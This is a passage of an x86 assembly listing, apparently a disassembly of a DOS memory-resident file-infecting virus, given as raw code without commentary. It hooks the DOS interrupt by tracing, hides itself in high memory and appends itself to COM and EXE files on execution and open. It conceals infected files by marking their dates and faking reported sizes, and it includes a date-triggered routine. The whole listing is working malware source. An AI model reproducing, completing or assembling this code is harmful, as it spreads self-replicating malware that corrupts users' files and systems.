;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_1       proc    near
        push    ds
        push    si
        xor si,si           ; Zero register
        mov ds,si
        xor ah,ah           ; Zero register
        mov si,ax
        shl si,1            ; Shift w/zeros fill
        shl si,1            ; Shift w/zeros fill
        mov bx,[si]
        mov es,[si+2]
        pop si
        pop ds
        retn
sub_1       endp
  
        mov word ptr cs:data_118e,1600h ; (3BCC:135B=0)
        mov cs:data_101e,ax     ; (3BCC:12E3=0)
        mov ah,30h          ; '0'
        int 21h         ; DOS Services  ah=function 30h
                        ;  get DOS version number ax
        mov cs:data_107e,al     ; (3BCC:12EE=0)
        mov cs:data_75e,ds      ; (3BCC:1245=3BCCh)
        mov ah,52h          ; 'R'
        int 21h         ; DOS Services  ah=function 52h
                        ;  get DOS data table ptr es:bx
        mov ax,es:[bx-2]
        mov cs:data_76e,ax      ; (3BCC:1247=0)
        mov es,ax
        mov ax,es:data_128e     ; (5200:0001=0)
        mov cs:data_77e,ax      ; (3BCC:1249=0)
        push    cs
        pop ds
        mov al,1
        call    sub_1           ; (02B5)
        mov ds:data_65e,bx      ; (3BCC:1231=0)
        mov word ptr ds:data_65e+2,es   ; (3BCC:1233=70h)
        mov al,21h          ; '!'
        call    sub_1           ; (02B5)
        mov ds:data_63e,bx      ; (3BCC:122D=0)
        mov word ptr ds:data_63e+2,es   ; (3BCC:122F=70h)
        mov byte ptr ds:data_81e,0  ; (3BCC:1250=0)
        mov dx,23h
        mov al,1
        call    sub_27          ; (11BC)
        pushf               ; Push flags
        pop ax
        or  ax,100h
        push    ax
        in  al,21h          ; port 21h, 8259-1 int IMR
        mov ds:data_102e,al     ; (3BCC:12E5=0)
        mov al,0FFh
        out 21h,al          ; port 21h, 8259-1 int comands
        popf                ; Pop flags
        mov ah,52h          ; 'R'
        pushf               ; Push flags
        call    dword ptr ds:data_63e   ; (3BCC:122D=0)
        pushf               ; Push flags
        pop ax
        and ax,0FEFFh
        push    ax
        popf                ; Pop flags
        mov al,ds:data_102e     ; (3BCC:12E5=0)
        out 21h,al          ; port 21h, 8259-1 int comands
        push    ds
        lds dx,dword ptr ds:data_65e    ; (3BCC:1231=0) Load 32 bit ptr
        mov al,1
        call    sub_27          ; (11BC)
        pop ds
        les di,dword ptr ds:data_63e    ; (3BCC:122D=0) Load 32 bit ptr
        mov ds:data_67e,di      ; (3BCC:1235=0)
        mov word ptr ds:data_67e+2,es   ; (3BCC:1237=70h)
        mov byte ptr ds:data_78e,0EAh   ; (3BCC:124B=0)
        mov word ptr ds:data_79e,2CCh   ; (3BCC:124C=0)
        mov ds:data_80e,cs      ; (3BCC:124E=3BCCh)
        call    sub_18          ; (0FDA)
        mov ax,4B00h
        mov ds:data_100e,ah     ; (3BCC:12E2=0)
        mov dx,data_30e+1       ; (3BCC:0021=0)
        push    word ptr ds:data_30e    ; (3BCC:0020=0)
        int 21h         ; DOS Services  ah=function 4Bh
                        ;  run progm @ds:dx, parm @es:bx
        pop word ptr ds:data_30e    ; (3BCC:0020=0)
        add word ptr es:[di-4],9
        nop
        mov es,ds:data_75e      ; (3BCC:1245=3BCCh)
        mov ds,ds:data_75e      ; (3BCC:1245=3BCCh)
        sub word ptr ds:data_21e,161h   ; (3BCC:0002=0)
        mov bp,ds:data_21e      ; (3BCC:0002=0)
        mov dx,ds
        sub bp,dx
        mov ah,4Ah          ; 'J'
        mov bx,0FFFFh
        int 21h         ; DOS Services  ah=function 4Ah
                        ;  change mem allocation, bx=siz
        mov ah,4Ah          ; 'J'
        int 21h         ; DOS Services  ah=function 4Ah
                        ;  change mem allocation, bx=siz
        dec dx
        mov ds,dx
        cmp byte ptr ds:data_18e,5Ah    ; (3BCB:0000=0FFh) 'Z'
        nop             ;*ASM fixup - sign extn byte
        je  loc_16          ; Jump if equal
        dec byte ptr cs:data_100e   ; (3BCC:12E2=0)
loc_16:
        cmp byte ptr cs:data_100e,0 ; (3BCC:12E2=0)
        je  loc_17          ; Jump if equal
        mov byte ptr ds:data_18e,4Dh    ; (3BCB:0000=0FFh) 'M'
loc_17:
        mov ax,ds:data_20e      ; (3BCB:0003=0FFFFh)
        mov bx,ax
        sub ax,161h
        add dx,ax
        mov ds:data_20e,ax      ; (3BCB:0003=0FFFFh)
        inc dx
        mov es,dx
        mov byte ptr es:data_15e,5Ah    ; (3A6A:0000=0FFh) 'Z'
        push    word ptr cs:data_77e    ; (3BCC:1249=0)
        pop word ptr es:data_16e    ; (3A6A:0001=0FFFFh)
        mov word ptr es:data_17e,160h   ; (3A6A:0003=0FFFFh)
        inc dx
        mov es,dx
        push    cs
        pop ds
        mov cx,0B00h
        mov si,data_120e        ; (3BCC:15FE=0)
        mov di,si
        std             ; Set direction flag
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        cld             ; Clear direction
        push    es
        mov ax,1EEh
        push    ax
        mov es,cs:data_75e      ; (3BCC:1245=3BCCh)
        mov ah,4Ah          ; 'J'
        mov bx,bp
        int 21h         ; DOS Services  ah=function 4Ah
                        ;  change mem allocation, bx=siz
        retf
        call    sub_18          ; (0FDA)
        mov cs:data_80e,cs      ; (3BCC:124E=3BCCh)
        call    sub_18          ; (0FDA)
        push    cs
        pop ds
        mov byte ptr ds:data_84e,14h    ; (3BCC:12A2=0)
        push    cs
        pop es
        mov di,data_83e     ; (3BCC:1252=0)
        mov cx,14h
        xor ax,ax           ; Zero register
        rep stosw           ; Rep when cx >0 Store ax to es:[di]
        mov ds:data_108e,al     ; (3BCC:12EF=0)
        mov ax,ds:data_75e      ; (3BCC:1245=3BCCh)
        mov es,ax
        lds dx,dword ptr es:data_25e    ; (3BCC:000A=0) Load 32 bit ptr
        mov ds,ax
        add ax,10h
        add word ptr cs:data_28e+2,ax   ; (3BCC:001A=0)
        cmp byte ptr cs:data_30e,0  ; (3BCC:0020=0)
        jne loc_18          ; Jump if not equal
        sti             ; Enable interrupts
        mov ax,cs:data_22e      ; (3BCC:0004=0)
        mov word ptr ds:[100h],ax   ; (3BCC:0100=85E9h)
        mov ax,cs:data_23e      ; (3BCC:0006=0)
        mov word ptr ds:[102h],ax   ; (3BCC:0102=2103h)
        mov ax,cs:data_24e      ; (3BCC:0008=0)
        mov word ptr ds:[104h],ax   ; (3BCC:0104=5914h)
        push    word ptr cs:data_75e    ; (3BCC:1245=3BCCh)
        mov ax,100h
        push    ax
        mov ax,cs:data_101e     ; (3BCC:12E3=0)
        retf                ; Return far
loc_18:
        add cs:data_26e,ax      ; (3BCC:0012=0)
        mov ax,cs:data_101e     ; (3BCC:12E3=0)
        mov ss,cs:data_26e      ; (3BCC:0012=0)
        mov sp,cs:data_27e      ; (3BCC:0014=0)
        sti             ; Enable interrupts
        jmp dword ptr cs:data_28e   ; (3BCC:0018=0)
loc_19:
        cmp sp,100h
        ja  loc_20          ; Jump if above
        xor sp,sp           ; Zero register
loc_20:
        mov bp,ax
        call    sub_2           ; (0495)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_2       proc    near
        pop cx
        sub cx,275h
        mov ax,cs
        mov bx,10h
        mul bx          ; dx:ax = reg * ax
        add ax,cx
        adc dx,0
        div bx          ; ax,dx rem=dx:ax/reg
        push    ax
        mov ax,0ABh
        push    ax
        mov ax,bp
        retf
sub_2       endp
  
        xor [si+7],bh
        and cx,[bp+4]
        aaa             ; Ascii adjust
        mov cx,ds:data_126e     ; (3BCC:8B4B=0)
        add ax,0D53Ch
        add al,3Dh          ; '='
        adc [di],ax
        db   3Eh, 55h, 05h, 0Fh, 9Bh, 03h
        db   14h,0CDh, 03h, 21h,0C1h, 03h
        db   27h,0BFh, 03h, 11h, 59h, 03h
        db   12h, 59h, 03h, 4Eh, 9Fh, 04h
        db   4Fh, 9Fh, 04h, 3Fh,0A5h, 0Ah
        db   40h, 8Ah, 0Bh, 42h, 90h, 0Ah
        db   57h, 41h, 0Ah, 48h, 34h, 0Eh
        db   3Dh, 00h, 4Bh, 75h, 04h, 2Eh
        db  0A2h,0E2h, 12h, 55h, 8Bh,0ECh
        db  0FFh, 76h, 06h, 2Eh, 8Fh, 06h
        db  0B3h, 12h, 5Dh, 55h, 8Bh,0ECh
        db  0E8h, 08h, 0Bh,0E8h,0D0h, 0Ah
        db  0E8h, 9Ah, 0Ah,0E8h,0F6h, 0Ah
        db  0E8h,0B4h, 0Ah, 53h,0BBh, 90h
        db   02h
loc_21:
        cmp ah,cs:[bx]
        jne loc_22          ; Jump if not equal
        mov bx,cs:[bx+1]
        xchg    bx,[bp-14h]
        cld             ; Clear direction
        retn
loc_22:
        add bx,3
        cmp bx,2CCh
        jb  loc_21          ; Jump if below
        pop bx
loc_23:
        call    sub_16          ; (0FBB)
        in  al,21h          ; port 21h, 8259-1 int IMR
        mov cs:data_102e,al     ; (3BCC:12E5=0)
        mov al,0FFh
        out 21h,al          ; port 21h, 8259-1 int comands
        mov byte ptr cs:data_82e,4  ; (3BCC:1251=0)
        mov byte ptr cs:data_81e,1  ; (3BCC:1250=0)
        call    sub_22          ; (103C)
        call    sub_19          ; (0FF3)
        push    ax
        mov ax,cs:data_93e      ; (3BCC:12B3=0)
        or  ax,100h
        push    ax
        popf                ; Pop flags
        pop ax
        pop bp
        jmp dword ptr cs:data_67e   ; (3BCC:1235=0)
loc_24:
        call    sub_21          ; (100F)
        call    sub_16          ; (0FBB)
        call    sub_18          ; (0FDA)
        call    sub_20          ; (1006)
        pop bp
        push    bp
        mov bp,sp
        push    word ptr cs:data_93e    ; (3BCC:12B3=0)
        pop word ptr [bp+6]
        pop bp
        iret                ; Interrupt return
        db  0E8h, 77h, 0Ah,0E8h, 35h, 0Bh
        db   0Ah,0C0h, 75h,0DCh,0E8h, 41h
        db   0Ah,0E8h, 18h, 02h,0B0h, 00h
        db   80h, 3Fh,0FFh, 75h, 06h, 8Ah
        db   47h, 06h, 83h,0C3h, 07h, 2Eh
        db   20h, 06h,0F0h, 12h,0F6h, 47h
        db   1Ah, 80h, 74h, 15h, 80h, 6Fh
        db   1Ah,0C8h, 2Eh, 80h, 3Eh,0F0h
        db   12h, 00h, 75h, 09h, 81h, 6Fh
        db   1Dh, 00h, 10h, 83h, 5Fh, 1Fh
        db   00h
loc_25:
        call    sub_19          ; (0FF3)
        jmp short loc_24        ; (055F)
        call    sub_19          ; (0FF3)
        call    sub_24          ; (10B4)
        call    sub_17          ; (0FC7)
        or  al,al           ; Zero ?
        jnz loc_25          ; Jump if not zero
        mov bx,dx
        test    byte ptr [bx+15h],80h
        jz  loc_25          ; Jump if zero
        sub byte ptr [bx+15h],0C8h
        sub word ptr [bx+10h],1000h
        sbb byte ptr [bx+12h],0
        jmp short loc_25        ; (05B6)
        jcxz    loc_27          ; Jump if cx=0
        mov bx,dx
        mov si,[bx+21h]
        or  si,[bx+23h]
        jnz loc_27          ; Jump if not zero
        jmp short loc_26        ; (05F7)
        mov bx,dx
        mov ax,[bx+0Ch]
        or  al,[bx+20h]
        jnz loc_27          ; Jump if not zero
loc_26:
        call    sub_7           ; (0B39)
        jnc loc_28          ; Jump if carry=0
loc_27:
        jmp loc_23          ; (052F)
loc_28:
        call    sub_19          ; (0FF3)
        call    sub_17          ; (0FC7)
        call    sub_24          ; (10B4)
        mov [bp-4],ax
        mov [bp-8],cx
        push    ds
        push    dx
        call    sub_3           ; (07A1)
        cmp word ptr [bx+14h],1
        je  loc_29          ; Jump if equal
        mov ax,[bx]
        add ax,[bx+2]
        add ax,[bx+4]
        jz  loc_29          ; Jump if zero
        add sp,4
        jmp short loc_25        ; (05B6)
loc_29:
        pop dx
        pop ds
        mov si,dx
        push    cs
        pop es
        mov di,data_94e     ; (3BCC:12B5=0)
        mov cx,25h
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        mov di,data_94e     ; (3BCC:12B5=0)
        push    cs
        pop ds
        mov ax,[di+10h]
        mov dx,[di+12h]
        add ax,100Fh
        adc dx,0
        and ax,0FFF0h
        mov [di+10h],ax
        mov [di+12h],dx
        sub ax,0FFCh
        sbb dx,0
        mov [di+21h],ax
        mov [di+23h],dx
        mov word ptr [di+0Eh],1
        mov cx,1Ch
        mov dx,di
        mov ah,27h          ; '''
        call    sub_24          ; (10B4)
        jmp loc_25          ; (05B6)
        db   0Eh, 07h, 8Bh,0F2h
        db  0BFh,0B5h, 12h,0B9h, 25h, 00h
        db  0F3h,0A4h, 1Eh, 52h, 0Eh, 1Fh
        db  0BAh,0B5h, 12h,0B4h, 0Fh,0E8h
        db   2Eh, 0Ah,0B4h, 10h,0E8h, 29h
        db   0Ah,0F6h, 06h,0CAh, 12h, 80h
        db   5Eh, 1Fh, 74h, 7Eh, 2Eh,0C4h
        db   1Eh,0C5h, 12h, 8Ch,0C0h, 81h
        db  0EBh, 00h, 10h, 1Dh, 00h, 00h
        db   33h,0D2h, 2Eh, 8Bh, 0Eh,0C3h
        db   12h, 49h, 03h,0D9h, 15h, 00h
        db   00h, 41h,0F7h,0F1h, 89h, 44h
        db   23h, 92h, 93h,0F7h,0F1h, 89h
        db   44h, 21h,0E9h,0F7h,0FEh, 2Eh
        db   83h, 26h,0B3h, 12h,0FEh,0E8h
        db   2Bh, 09h,0E8h,0E9h, 09h,0E8h
        db  0F9h, 08h, 73h, 09h, 2Eh, 83h
        db   0Eh,0B3h, 12h, 01h,0E9h,0DDh
        db  0FEh
loc_30:
        call    sub_3           ; (07A1)
        test    byte ptr [bx+19h],80h
        jnz loc_31          ; Jump if not zero
        jmp loc_25          ; (05B6)
loc_31:
        sub word ptr [bx+1Ah],1000h
        sbb word ptr [bx+1Ch],0
        sub byte ptr [bx+19h],0C8h
        jmp loc_25          ; (05B6)
        push    cx
        and cx,7
        cmp cx,7
        je  loc_35          ; Jump if equal
        pop cx
        call    sub_13          ; (0EE6)
        call    sub_24          ; (10B4)
        call    sub_14          ; (0F8C)
        pushf               ; Push flags
        cmp byte ptr cs:data_95e,0  ; (3BCC:12DA=0)
        je  loc_33          ; Jump if equal
        popf                ; Pop flags
loc_32:
        jmp loc_23          ; (052F)
loc_33:
        popf                ; Pop flags
        jc  loc_34          ; Jump if carry Set
        mov bx,ax
        mov ah,3Eh          ; '>'
        call    sub_24          ; (10B4)
        jmp short loc_36        ; (0731)
loc_34:
        or  byte ptr cs:data_93e,1  ; (3BCC:12B3=0)
        mov [bp-4],ax
        jmp loc_25          ; (05B6)
loc_35:
        pop cx
        jmp loc_23          ; (052F)
loc_36:
        call    sub_9           ; (0B91)
        call    sub_8           ; (0B45)
        jc  loc_38          ; Jump if carry Set
        cmp byte ptr cs:data_84e,0  ; (3BCC:12A2=0)
        je  loc_38          ; Jump if equal
        call    sub_10          ; (0B9E)
        cmp bx,0FFFFh
        je  loc_38          ; Jump if equal
        dec byte ptr cs:data_84e    ; (3BCC:12A2=0)
        push    cs
        pop es
        mov di,data_83e     ; (3BCC:1252=0)
        mov cx,14h
        xor ax,ax           ; Zero register
        repne   scasw           ; Rep zf=0+cx >0 Scan es:[di] for ax
        mov ax,cs:data_85e      ; (3BCC:12A3=0)
        mov es:[di-2],ax
        mov es:[di+26h],bx
        mov [bp-4],bx
loc_37:
        and byte ptr cs:data_93e,0FEh   ; (3BCC:12B3=0)
        jmp loc_25          ; (05B6)
loc_38:
        jmp loc_23          ; (052F)
        db   0Eh, 07h,0E8h, 17h, 04h
        db  0BFh, 52h, 12h,0B9h, 14h, 00h
        db   2Eh,0A1h,0A3h, 12h
loc_39:
        repne   scasw           ; Rep zf=0+cx >0 Scan es:[di] for ax
        jnz loc_40          ; Jump if not zero
        cmp bx,es:[di+26h]
        jne loc_39          ; Jump if not equal
        mov word ptr es:[di-2],0
        call    sub_4           ; (09B3)
        inc byte ptr cs:data_84e    ; (3BCC:12A2=0)
        jmp short loc_37        ; (0769)
loc_40:
        jmp loc_23          ; (052F)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_3       proc    near
        push    es
        mov ah,2Fh          ; '/'
        call    sub_24          ; (10B4)
        push    es
        pop ds
        pop es
        retn
sub_3       endp
  
        or  al,al           ; Zero ?
        jz  loc_41          ; Jump if zero
        jmp loc_48          ; (0900)
loc_41:
        push    ds
        push    dx
        mov cs:data_58e,bx      ; (3BCC:1224=0)
        mov word ptr cs:data_58e+2,es   ; (3BCC:1226=3BCCh)
        lds si,dword ptr cs:data_58e    ; (3BCC:1224=0) Load 32 bit ptr
        mov di,data_110e        ; (3BCC:12F1=0)
        mov cx,0Eh
        push    cs
        pop es
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        pop si
        pop ds
        mov di,data_115e        ; (3BCC:1307=0)
        mov cx,50h
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        mov bx,0FFFFh
        call    sub_23          ; (105A)
        call    sub_19          ; (0FF3)
        pop bp
        pop word ptr cs:data_103e   ; (3BCC:12E6=0)
        pop word ptr cs:data_104e   ; (3BCC:12E8=0)
        pop word ptr cs:data_93e    ; (3BCC:12B3=0)
        mov ax,4B01h
        push    cs
        pop es
        mov bx,12F1h
        pushf               ; Push flags
        call    dword ptr cs:data_67e   ; (3BCC:1235=0)
        jnc loc_42          ; Jump if carry=0
        or  word ptr cs:data_93e,1  ; (3BCC:12B3=0)
        push    word ptr cs:data_93e    ; (3BCC:12B3=0)
        push    word ptr cs:data_104e   ; (3BCC:12E8=0)
        push    word ptr cs:data_103e   ; (3BCC:12E6=0)
        push    bp
        mov bp,sp
        les bx,dword ptr cs:data_58e    ; (3BCC:1224=0) Load 32 bit ptr
        jmp loc_24          ; (055F)
loc_42:
        call    sub_9           ; (0B91)
        push    cs
        pop es
        mov di,data_83e     ; (3BCC:1252=0)
        mov cx,14h
loc_43:
        mov ax,cs:data_85e      ; (3BCC:12A3=0)
        repne   scasw           ; Rep zf=0+cx >0 Scan es:[di] for ax
        jnz loc_44          ; Jump if not zero
        mov word ptr es:[di-2],0
        inc byte ptr cs:data_84e    ; (3BCC:12A2=0)
        jmp short loc_43        ; (082B)
loc_44:
        lds si,dword ptr cs:data_113e   ; (3BCC:1303=0) Load 32 bit ptr
        cmp si,1
        jne loc_45          ; Jump if not equal
        mov dx,ds:data_6e       ; (0000:001A=0F000h)
        add dx,10h
        mov ah,51h          ; 'Q'
        call    sub_24          ; (10B4)
        add dx,bx
        mov word ptr cs:data_113e+2,dx  ; (3BCC:1305=0)
        push    word ptr ds:data_5e ; (0000:0018=0EB52h)
        pop word ptr cs:data_113e   ; (3BCC:1303=0)
        add bx,10h
        add bx,ds:data_3e       ; (0000:0012=70h)
        mov cs:data_112e,bx     ; (3BCC:1301=0)
        push    word ptr ds:data_4e ; (0000:0014=0FF54h)
        pop word ptr cs:data_111e   ; (3BCC:12FF=0)
        jmp short loc_46        ; (089F)
loc_45:
        mov ax,[si]
        add ax,[si+2]
        add ax,[si+4]
        jz  loc_47          ; Jump if zero
        push    cs
        pop ds
        mov dx,1307h
        call    sub_8           ; (0B45)
        call    sub_10          ; (0B9E)
        inc byte ptr cs:data_108e   ; (3BCC:12EF=0)
        call    sub_4           ; (09B3)
        dec byte ptr cs:data_108e   ; (3BCC:12EF=0)
loc_46:
        mov ah,51h          ; 'Q'
        call    sub_24          ; (10B4)
        call    sub_21          ; (100F)
        call    sub_16          ; (0FBB)
        call    sub_18          ; (0FDA)
        call    sub_20          ; (1006)
        mov ds,bx
        mov es,bx
        push    word ptr cs:data_93e    ; (3BCC:12B3=0)
        push    word ptr cs:data_104e   ; (3BCC:12E8=0)
        push    word ptr cs:data_103e   ; (3BCC:12E6=0)
        pop word ptr ds:data_10e    ; (068A:000A=6E41h)
        pop word ptr ds:data_10e+2  ; (068A:000C=7264h)
        push    ds
        lds dx,dword ptr ds:data_10e    ; (068A:000A=6E41h) Load 32 bit ptr
        mov al,22h          ; '"'
        call    sub_27          ; (11BC)
        pop ds
        popf                ; Pop flags
        pop ax
        mov ss,cs:data_112e     ; (3BCC:1301=0)
        mov sp,cs:data_111e     ; (3BCC:12FF=0)
        jmp dword ptr cs:data_113e  ; (3BCC:1303=0)
loc_47:
        mov bx,[si+1]
        mov ax,ds:data_12e[bx+si]   ; (068A:FD9F=6580h)
        mov [si],ax
        mov ax,ds:data_13e[bx+si]   ; (068A:FDA1=0C004h)
        mov [si+2],ax
        mov ax,ds:data_14e[bx+si]   ; (068A:FDA3=8026h)
        mov [si+4],ax
        jmp short loc_46        ; (089F)
loc_48:
        cmp al,1
        je  loc_49          ; Jump if equal
        jmp loc_23          ; (052F)
loc_49:
        or  word ptr cs:data_93e,1  ; (3BCC:12B3=0)
        mov cs:data_58e,bx      ; (3BCC:1224=0)
        mov word ptr cs:data_58e+2,es   ; (3BCC:1226=3BCCh)
        call    sub_19          ; (0FF3)
        call    sub_24          ; (10B4)
        call    sub_17          ; (0FC7)
        les bx,dword ptr cs:data_58e    ; (3BCC:1224=0) Load 32 bit ptr
        lds si,dword ptr es:[bx+12h]    ; Load 32 bit ptr
        jc  loc_52          ; Jump if carry Set
        and byte ptr cs:data_93e,0FEh   ; (3BCC:12B3=0)
        cmp si,1
        je  loc_50          ; Jump if equal
        mov ax,[si]
        add ax,[si+2]
        add ax,[si+4]
        jnz loc_51          ; Jump if not zero
        mov bx,[si+1]
        mov ax,ds:data_7e[bx+si]    ; (0000:FD9F=19B4h)
        mov [si],ax
        mov ax,ds:data_8e[bx+si]    ; (0000:FDA1=21CDh)
        mov [si+2],ax
        mov ax,ds:data_9e[bx+si]    ; (0000:FDA3=0B450h)
        mov [si+4],ax
        jmp short loc_51        ; (0985)
loc_50:
        mov dx,ds:data_6e       ; (0000:001A=0F000h)
        call    sub_9           ; (0B91)
        mov cx,cs:data_85e      ; (3BCC:12A3=0)
        add cx,10h
        add dx,cx
        mov es:[bx+14h],dx
        mov ax,ds:data_5e       ; (0000:0018=0EB52h)
        mov es:[bx+12h],ax
        mov ax,ds:data_3e       ; (0000:0012=70h)
        add ax,cx
        mov es:[bx+10h],ax
        mov ax,ds:data_4e       ; (0000:0014=0FF54h)
        mov es:[bx+0Eh],ax
loc_51:
        call    sub_9           ; (0B91)
        mov ds,cs:data_85e      ; (3BCC:12A3=0)
        mov ax,[bp+2]
        mov ds:data_1e,ax       ; (0000:000A=3E6h)
        mov ax,[bp+4]
        mov word ptr ds:data_1e+2,ax    ; (0000:000C=6F4h)
loc_52:
        jmp loc_25          ; (05B6)
        mov byte ptr cs:data_109e,0 ; (3BCC:12F0=0)
        mov ah,2Ah          ; '*'
        call    sub_24          ; (10B4)
        cmp dx,916h
        jb  loc_53          ; Jump if below
        call    sub_28          ; (11D2)
loc_53:
        jmp loc_23          ; (052F)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_4       proc    near
        call    sub_13          ; (0EE6)
        call    sub_5           ; (0A75)
        mov byte ptr ds:data_30e,1  ; (3BCC:0020=0)
        cmp word ptr ds:[1200h],5A4Dh   ; (3BCC:1200=70h)
        je  loc_54          ; Jump if equal
        cmp word ptr ds:[1200h],4D5Ah   ; (3BCC:1200=70h)
        je  loc_54          ; Jump if equal
        dec byte ptr ds:data_30e    ; (3BCC:0020=0)
        jz  loc_57          ; Jump if zero
loc_54:
        mov ax,word ptr ds:[1204h]  ; (3BCC:1204=32Eh)
        shl cx,1            ; Shift w/zeros fill
        mul cx          ; dx:ax = reg * ax
        add ax,200h
        cmp ax,si
        jb  loc_56          ; Jump if below
        mov ax,word ptr ds:[120Ah]  ; (3BCC:120A=8EEFh)
        or  ax,word ptr ds:[120Ch]  ; (3BCC:120C=0)
        jz  loc_56          ; Jump if zero
        mov ax,ds:data_88e      ; (3BCC:12A9=0)
        mov dx,ds:data_89e      ; (3BCC:12AB=0)
        mov cx,200h
        div cx          ; ax,dx rem=dx:ax/reg
        or  dx,dx           ; Zero ?
        jz  loc_55          ; Jump if zero
        inc ax
loc_55:
        mov word ptr ds:[1204h],ax  ; (3BCC:1204=32Eh)
        mov word ptr ds:[1202h],dx  ; (3BCC:1202=0E33h)
        cmp word ptr ds:[1214h],1   ; (3BCC:1214=8D8Eh)
        je  loc_58          ; Jump if equal
        mov word ptr ds:[1214h],1   ; (3BCC:1214=8D8Eh)
        mov ax,si
        sub ax,word ptr ds:[1208h]  ; (3BCC:1208=1111h)
        mov word ptr ds:[1216h],ax  ; (3BCC:1216=1111h)
        add word ptr ds:[1204h],8   ; (3BCC:1204=32Eh)
        mov word ptr ds:[120Eh],ax  ; (3BCC:120E=1111h)
        mov word ptr ds:[1210h],1000h   ; (3BCC:1210=1250h)
        call    sub_6           ; (0AD3)
loc_56:
        jmp short loc_58        ; (0A6C)
loc_57:
        cmp si,0F00h
        jae loc_58          ; Jump if above or =
        mov ax,word ptr ds:[1200h]  ; (3BCC:1200=70h)
        mov ds:data_22e,ax      ; (3BCC:0004=0)
        add dx,ax
        mov ax,word ptr ds:[1202h]  ; (3BCC:1202=0E33h)
        mov ds:data_23e,ax      ; (3BCC:0006=0)
        add dx,ax
        mov ax,word ptr ds:[1204h]  ; (3BCC:1204=32Eh)
        mov ds:data_24e,ax      ; (3BCC:0008=0)
        add dx,ax
        jz  loc_58          ; Jump if zero
        mov cl,0E9h
        mov byte ptr ds:[1200h],cl  ; (3BCC:1200=70h)
        mov ax,10h
        mul si          ; dx:ax = reg * ax
        add ax,265h
        mov word ptr ds:[1201h],ax  ; (3BCC:1201=3300h)
        mov ax,word ptr ds:[1200h]  ; (3BCC:1200=70h)
        add ax,word ptr ds:[1202h]  ; (3BCC:1202=0E33h)
        neg ax
        mov word ptr ds:[1204h],ax  ; (3BCC:1204=32Eh)
        call    sub_6           ; (0AD3)
loc_58:
        mov ah,3Eh          ; '>'
        call    sub_24          ; (10B4)
        call    sub_14          ; (0F8C)
        retn
sub_4       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_5       proc    near
        push    cs
        pop ds
        mov ax,5700h
        call    sub_24          ; (10B4)
        mov ds:data_61e,cx      ; (3BCC:1229=0)
        mov ds:data_62e,dx      ; (3BCC:122B=0)
        mov ax,4200h
        xor cx,cx           ; Zero register
        mov dx,cx
        call    sub_24          ; (10B4)
        mov ah,3Fh          ; '?'
        mov cl,1Ch
        mov dx,1200h
        call    sub_24          ; (10B4)
        mov ax,4200h
        xor cx,cx           ; Zero register
        mov dx,cx
        call    sub_24          ; (10B4)
        mov ah,3Fh          ; '?'
        mov cl,1Ch
        mov dx,4
        call    sub_24          ; (10B4)
        mov ax,4202h
        xor cx,cx           ; Zero register
        mov dx,cx
        call    sub_24          ; (10B4)
        mov ds:data_88e,ax      ; (3BCC:12A9=0)
        mov ds:data_89e,dx      ; (3BCC:12AB=0)
        mov di,ax
        add ax,0Fh
        adc dx,0
        and ax,0FFF0h
        sub di,ax
        mov cx,10h
        div cx          ; ax,dx rem=dx:ax/reg
        mov si,ax
        retn
sub_5       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_6       proc    near
        mov ax,4200h
        xor cx,cx           ; Zero register
        mov dx,cx
        call    sub_24          ; (10B4)
        mov ah,40h          ; '@'
        mov cl,1Ch
        mov dx,1200h
        call    sub_24          ; (10B4)
        mov ax,10h
        mul si          ; dx:ax = reg * ax
        mov cx,dx
        mov dx,ax
        mov ax,4200h
        call    sub_24          ; (10B4)
        xor dx,dx           ; Zero register
        mov cx,1000h
        add cx,di
        mov ah,40h          ; '@'
        call    sub_24          ; (10B4)
        mov ax,5701h
        mov cx,ds:data_61e      ; (3BCC:1229=0)
        mov dx,ds:data_62e      ; (3BCC:122B=0)
        test    dh,80h
        jnz loc_59          ; Jump if not zero
        add dh,0C8h
loc_59:
        call    sub_24          ; (10B4)
        cmp byte ptr ds:data_107e,3 ; (3BCC:12EE=0)
        jb  loc_ret_60      ; Jump if below
        cmp byte ptr ds:data_108e,0 ; (3BCC:12EF=0)
        je  loc_ret_60      ; Jump if equal
        push    bx
        mov dl,ds:data_60e      ; (3BCC:1228=0)
        mov ah,32h          ; '2'
        call    sub_24          ; (10B4)
        mov ax,cs:data_106e     ; (3BCC:12EC=0)
        mov [bx+1Eh],ax
        pop bx
  
loc_ret_60:
        retn
sub_6       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
